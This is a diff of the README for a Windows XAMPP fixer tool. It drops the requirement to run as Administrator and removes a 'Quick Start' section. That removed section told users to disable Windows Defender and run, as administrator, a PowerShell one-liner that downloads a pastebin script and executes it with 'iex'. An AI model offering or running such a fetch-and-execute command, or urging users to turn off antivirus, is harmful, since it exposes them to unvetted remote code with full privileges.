@@ -11,13 +11,7 @@ A powerful Windows tool that automatically detects and fixes common XAMPP issues
 - **🎯 One-Click Solution**: Fix multiple issues with a single run
 
 ## 🚀 Quick Start
-##  Easy One
-**If it doesnot run, You can just turn off the windows defender and run this script for your ease and time saving**
 
-- **Run `Powershell as administrator`**
-```bash
-    irm https://pastebin.com/raw/11jeZZVn | iex
-```
 
 ### Option 1: Run Python Script (Make sure to have python and pip installed)-Recommended
 **Check if both python and pip is available or not**
@@ -47,7 +41,7 @@ A powerful Windows tool that automatically detects and fixes common XAMPP issues
     xampp_fixer.bat
 ```
 
-1. **Select** `Run as administrator"`
+1. **Open Terminal**
 2. **Follow** `the on-screen prompts`
 3. **Done!** `Your XAMPP should be working`
 
@@ -87,7 +81,6 @@ A powerful Windows tool that automatically detects and fixes common XAMPP issues
 ## 📋 Requirements
 
 - **Windows 10/11** (Windows 8.1+ supported)
-- **Administrator privileges** (required)
 - **XAMPP installed** on C:, D:, E:, or F: drive
 
 ## 🛡️ Safety Features
@@ -100,14 +93,13 @@ A powerful Windows tool that automatically detects and fixes common XAMPP issues
 ## 📖 How to Use
 
 1. **Close XAMPP** Control Panel completely
-2. **Run** `xampp_fixer.exe` as administrator
+2. **Run** `xampp_fixer.exe` 
 3. **Let it diagnose** your XAMPP installation
 4. **Choose fixes** when prompted
 5. **Open XAMPP** Control Panel and start services
 
 ## 💡 Pro Tips
 
-- Always run as **Administrator**
 - Close XAMPP Control Panel before running
 - Keep the generated backups safe
 - Test your websites after fixing
@@ -121,10 +113,9 @@ A powerful Windows tool that automatically detects and fixes common XAMPP issues
 ## 📞 Support
 
 If you encounter any issues:
-1. Check that you're running as Administrator
-2. Ensure XAMPP is properly installed
-3. Try restarting your computer
-4. Create an issue on GitHub with error details
+1. Ensure XAMPP is properly installed
+2. Try restarting your computer
+3. Create an issue on GitHub with error details
 
 ---
 
